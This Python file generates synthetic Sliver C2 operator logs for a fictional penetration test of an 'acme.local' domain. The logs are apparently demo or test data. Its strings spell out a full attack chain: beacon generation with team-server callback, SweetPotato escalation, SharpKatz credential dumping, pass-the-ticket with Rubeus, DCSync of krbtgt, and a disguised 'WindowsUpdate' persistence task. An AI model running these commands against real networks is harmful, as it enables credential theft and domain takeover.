"""
Sliver C2 session log generator.

Produces realistic operator-side log entries that mirror what an operator
would record while using the Sliver C2 framework (implant generation,
sessions, pivots, post-exploitation).  All IPs, hostnames, and credentials
are fictional.
"""

import random
from datetime import timedelta

# ---------------------------------------------------------------------------
# Fictional network context
# ---------------------------------------------------------------------------
TEAM_SERVER = "10.0.50.5"
IMPLANT_NAMES = ["ROUND_PANDA", "DARK_EAGLE", "SWIFT_COBRA", "GRAY_FALCON"]
BEACON_INTERVALS = ["5s", "30s", "60s", "5m"]
TARGET_HOSTS = [
    {"hostname": "WS-PC101.acme.local", "ip": "10.10.3.101", "user": "jdoe"},
    {"hostname": "WS-PC204.acme.local", "ip": "10.10.3.204", "user": "agarcia"},
    {"hostname": "SRV-APP01.acme.local", "ip": "10.10.1.20", "user": "svc_app"},
    {"hostname": "DC02.acme.local", "ip": "10.10.1.2", "user": "DA-operator"},
    {"hostname": "SRV-FILE01.acme.local", "ip": "10.10.1.30", "user": "svc_backup"},
]
DOMAIN = "acme.local"


def generate_session_logs(
    *,
    analyst="c2-operator1",
    base_offset_hours=-72,
    operation_name="PHANTOM WIRE",
):
    """Return a list of log-entry dicts for a full Sliver engagement."""

    logs = []
    hour = base_offset_hours

    # --- 1. Implant generation ---
    implant = random.choice(IMPLANT_NAMES)
    interval = random.choice(BEACON_INTERVALS)
    logs.append(
        _entry(
            hour,
            hostname=f"operator@teamserver ({TEAM_SERVER})",
            command=(
                f"generate beacon --mtls {TEAM_SERVER}:8888 "
                f"--os windows --arch amd64 --name {implant} "
                f"--seconds {interval}"
            ),
            notes=f"Generated Sliver beacon implant '{implant}' with {interval} callback interval",
            tags=["sliver", "execution", "command-and-control"],
            analyst=analyst,
            operation=operation_name,
        )
    )
    hour += 0.5

    # --- 2. Initial callback ---
    target = TARGET_HOSTS[0]
    logs.append(
        _entry(
            hour,
            hostname=target["hostname"],
            internal_ip=target["ip"],
            username=target["user"],
            command=f"[*] Session {_session_id()} - {implant} - {target['ip']}:{random.randint(49152,65535)} -> {TEAM_SERVER}:8888 (mTLS)",
            notes="Initial beacon callback received from phished workstation",
            tags=["sliver", "initial-access", "command-and-control"],
            analyst=analyst,
            operation=operation_name,
            pid=str(random.randint(1000, 9999)),
        )
    )
    hour += 0.25

    # --- 3. Situational awareness ---
    logs.append(
        _entry(
            hour,
            hostname=target["hostname"],
            internal_ip=target["ip"],
            username=target["user"],
            command="info",
            notes=f"Gathered implant info: OS=Windows 10 Build 19045, Arch=amd64, PID={random.randint(1000,9999)}",
            tags=["sliver", "discovery"],
            analyst=analyst,
            operation=operation_name,
        )
    )
    hour += 0.1

    logs.append(
        _entry(
            hour,
            hostname=target["hostname"],
            internal_ip=target["ip"],
            username=target["user"],
            command="getuid",
            notes=f"Current token: {DOMAIN}\\{target['user']} (medium integrity)",
            tags=["sliver", "discovery"],
            analyst=analyst,
            operation=operation_name,
        )
    )
    hour += 0.1

    logs.append(
        _entry(
            hour,
            hostname=target["hostname"],
            internal_ip=target["ip"],
            username=target["user"],
            command="ps -T",
            notes="Listed running processes; identified AV (MsMpEng.exe PID 1824) and EDR agent (CrowdStrike PID 2048)",
            tags=["sliver", "discovery", "defense-evasion"],
            analyst=analyst,
            operation=operation_name,
        )
    )
    hour += 0.1

    logs.append(
        _entry(
            hour,
            hostname=target["hostname"],
            internal_ip=target["ip"],
            username=target["user"],
            command="netstat",
            notes="Enumerated network connections; noted connections to 10.10.1.2:389 (LDAP) and 10.10.1.5:88 (Kerberos)",
            tags=["sliver", "discovery"],
            analyst=analyst,
            operation=operation_name,
        )
    )
    hour += 0.25

    # --- 4. Privilege escalation ---
    logs.append(
        _entry(
            hour,
            hostname=target["hostname"],
            internal_ip=target["ip"],
            username=target["user"],
            command="execute-assembly /opt/tools/SweetPotato.exe -p beacon.exe",
            notes="Privilege escalation via SweetPotato (SeImpersonatePrivilege) — SYSTEM token obtained",
            tags=["sliver", "privilege-escalation"],
            analyst=analyst,
            operation=operation_name,
            status="success",
        )
    )
    hour += 0.5

    # --- 5. Credential harvesting ---
    logs.append(
        _entry(
            hour,
            hostname=target["hostname"],
            internal_ip=target["ip"],
            username="NT AUTHORITY\\SYSTEM",
            command="execute-assembly /opt/tools/SharpKatz.exe --command logonpasswords",
            notes="Dumped credentials from LSASS; recovered NTLM hash for svc_app and cleartext password for agarcia",
            tags=["sliver", "credential-access"],
            analyst=analyst,
            operation=operation_name,
            status="success",
        )
    )
    hour += 0.25

    # --- 6. Lateral movement via pivot ---
    pivot_target = TARGET_HOSTS[2]  # SRV-APP01
    logs.append(
        _entry(
            hour,
            hostname=target["hostname"],
            internal_ip=target["ip"],
            username="NT AUTHORITY\\SYSTEM",
            command=f"pivots tcp --bind 10.10.3.101:4444",
            notes=f"Started TCP pivot listener on compromised host for lateral movement to {pivot_target['hostname']}",
            tags=["sliver", "lateral-movement", "command-and-control"],
            analyst=analyst,
            operation=operation_name,
        )
    )
    hour += 0.25

    logs.append(
        _entry(
            hour,
            hostname=target["hostname"],
            internal_ip=target["ip"],
            username="NT AUTHORITY\\SYSTEM",
            command=f"psexec -s {pivot_target['ip']} -u {DOMAIN}\\{pivot_target['user']}",
            notes=f"PsExec lateral movement to {pivot_target['hostname']} using harvested svc_app NTLM hash",
            tags=["sliver", "lateral-movement"],
            analyst=analyst,
            operation=operation_name,
            status="success",
        )
    )
    hour += 0.5

    # --- 7. New session on app server ---
    logs.append(
        _entry(
            hour,
            hostname=pivot_target["hostname"],
            internal_ip=pivot_target["ip"],
            username=pivot_target["user"],
            command=f"[*] Session {_session_id()} - {implant} - {pivot_target['ip']}:4444 -> {target['ip']}:4444 (pivot/tcp)",
            notes=f"New beacon session on {pivot_target['hostname']} via TCP pivot through {target['hostname']}",
            tags=["sliver", "command-and-control", "lateral-movement"],
            analyst=analyst,
            operation=operation_name,
            pid=str(random.randint(1000, 9999)),
        )
    )
    hour += 0.25

    # --- 8. Domain recon from app server ---
    logs.append(
        _entry(
            hour,
            hostname=pivot_target["hostname"],
            internal_ip=pivot_target["ip"],
            username=pivot_target["user"],
            command="execute-assembly /opt/tools/SharpHound.exe -c All --outputdirectory C:\\Windows\\Temp",
            notes="Ran BloodHound collection (all methods); output saved to C:\\Windows\\Temp\\*.zip",
            tags=["sliver", "discovery", "bloodhound"],
            analyst=analyst,
            operation=operation_name,
            filename="20260323_BloodHound.zip",
        )
    )
    hour += 0.5

    logs.append(
        _entry(
            hour,
            hostname=pivot_target["hostname"],
            internal_ip=pivot_target["ip"],
            username=pivot_target["user"],
            command="download C:\\Windows\\Temp\\20260323_BloodHound.zip /loot/",
            notes="Exfiltrated BloodHound data back to teamserver",
            tags=["sliver", "exfiltration"],
            analyst=analyst,
            operation=operation_name,
        )
    )
    hour += 0.25

    # --- 9. DC attack ---
    dc = TARGET_HOSTS[3]  # DC02
    logs.append(
        _entry(
            hour,
            hostname=pivot_target["hostname"],
            internal_ip=pivot_target["ip"],
            username=pivot_target["user"],
            command=f"execute-assembly /opt/tools/Rubeus.exe asktgt /user:DA-operator /rc4:<ntlm_hash> /ptt",
            notes=f"Kerberos TGT request with harvested DA-operator NTLM hash — pass-the-ticket",
            tags=["sliver", "credential-access", "lateral-movement", "rubeus"],
            analyst=analyst,
            operation=operation_name,
            status="success",
        )
    )
    hour += 0.25

    logs.append(
        _entry(
            hour,
            hostname=dc["hostname"],
            internal_ip=dc["ip"],
            username=dc["user"],
            command=f"[*] Session {_session_id()} - {implant} - {dc['ip']}:{random.randint(49152,65535)} -> {TEAM_SERVER}:8888 (mTLS)",
            notes=f"Beacon callback from domain controller {dc['hostname']} — domain admin achieved",
            tags=["sliver", "command-and-control", "domain-controller", "high"],
            analyst=analyst,
            operation=operation_name,
            pid=str(random.randint(1000, 9999)),
        )
    )
    hour += 0.25

    logs.append(
        _entry(
            hour,
            hostname=dc["hostname"],
            internal_ip=dc["ip"],
            username=dc["user"],
            command="execute-assembly /opt/tools/SharpKatz.exe --command dcsync --user krbtgt",
            notes="DCSync for krbtgt — full domain compromise; golden ticket capability obtained",
            tags=["sliver", "credential-access", "domain-controller", "critical"],
            analyst=analyst,
            operation=operation_name,
            status="success",
        )
    )
    hour += 0.5

    # --- 10. Persistence ---
    logs.append(
        _entry(
            hour,
            hostname=dc["hostname"],
            internal_ip=dc["ip"],
            username=dc["user"],
            command="execute-assembly /opt/tools/SharPersist.exe -t schtask -n 'WindowsUpdate' -c beacon.exe -m add",
            notes="Installed scheduled task persistence on DC02 as 'WindowsUpdate' — 15 min interval",
            tags=["sliver", "persistence", "domain-controller"],
            analyst=analyst,
            operation=operation_name,
        )
    )

    return logs


def _entry(
    offset_hours,
    *,
    hostname="",
    internal_ip="",
    external_ip="",
    username="",
    command="",
    notes="",
    tags=None,
    analyst="",
    operation="",
    status="success",
    pid="",
    filename="",
):
    return {
        "timestamp_offset_hours": offset_hours,
        "hostname": hostname,
        "internal_ip": internal_ip,
        "external_ip": external_ip,
        "domain": DOMAIN,
        "username": username,
        "command": command,
        "notes": notes,
        "status": status,
        "analyst": analyst,
        "op": operation,
        "tags": tags or [],
        "pid": pid,
        "filename": filename,
    }


def _session_id():
    return f"{random.randint(0x10000000, 0xFFFFFFFF):08x}"


PROFILE = {
    "name": "Sliver",
    "description": "BishopFox Sliver C2 framework — mTLS beacons, TCP pivots, execute-assembly post-exploitation",
    "default_operation": {
        "name": "PHANTOM WIRE",
        "description": "Internal network penetration test using Sliver C2 framework against acme.local AD environment",
    },
    "default_analyst": "c2-operator1",
    "generate": generate_session_logs,
}
